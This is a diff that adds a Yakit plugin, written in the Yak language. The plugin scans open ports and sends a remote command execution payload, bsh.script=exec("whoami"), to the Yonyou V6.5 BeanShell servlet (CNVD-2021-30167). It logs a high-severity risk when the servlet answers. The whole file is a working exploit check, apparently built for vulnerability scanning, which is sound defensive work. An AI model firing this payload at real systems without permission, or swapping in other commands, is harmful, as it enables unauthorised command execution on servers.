@@ -1,0 +1,57 @@
+# port scan plugin
+yakit.AutoInitYakit()
+
+handleCheck = func(target,port, payload){
+    addr = str.HostPort(target, port)
+    isTls = str.IsTLSServer(addr)
+
+    packet = `
+POST /servlet/~ic/bsh.servlet.BshServlet HTTP/1.1
+Host: {{params(target)}}
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0
+
+{{params(payload)}}`
+    println(payload)
+    rsp,req,_ = poc.HTTP(packet, 
+    poc.params({"target":addr,"payload":payload}),
+    poc.https(isTls),
+    poc.redirectTimes(0),
+    )
+    // dump(rsp)
+    if len(rsp) > 0 {
+        println(string(rsp))
+        if str.MatchAllOfSubString(rsp, `/servlet/~ic/bsh.servlet.BshServlet`) && str.MatchAllOfSubString(rsp, `HTTP/1.1 200 OK`){
+            yakit.Info("%v 用友V6.5 BshServlet_CNVD-2021-30167前台命令执行漏洞", addr)
+            risk.NewRisk(
+            addr,risk.title("用友V6.5 BshServlet_CNVD-2021-30167前台命令执行漏洞"),
+            risk.severity("high"),
+            risk.titleVerbose("用友V6.5 BshServlet_CNVD-2021-30167前台命令执行漏洞存在"),
+            risk.type("RCE[用友V6.5]"),
+            risk.payload(`bsh.script=exec%28%22whoami%22%29%3B%0D%0A`),
+            risk.request(string(req)),
+            risk.response(string(rsp)),
+        )
+        }else{
+            println("不存在用友V6.5 BshServlet_CNVD-2021-30167前台命令执行漏洞")
+            }
+       
+    }
+
+    return
+}
+handle = func(result /* *fp.MatchResult */) {
+    // handle match result
+    if !result.IsOpen(){
+        return
+    }
+    payload = `bsh.script=\u0065\u0078\u0065\u0063%28%22whoami%22%29%3B%0D%0A`
+
+    if len(result.Fingerprint.HttpFlows)>0{
+        handleCheck(result.Target,result.Port, payload)
+    }
+    
+}
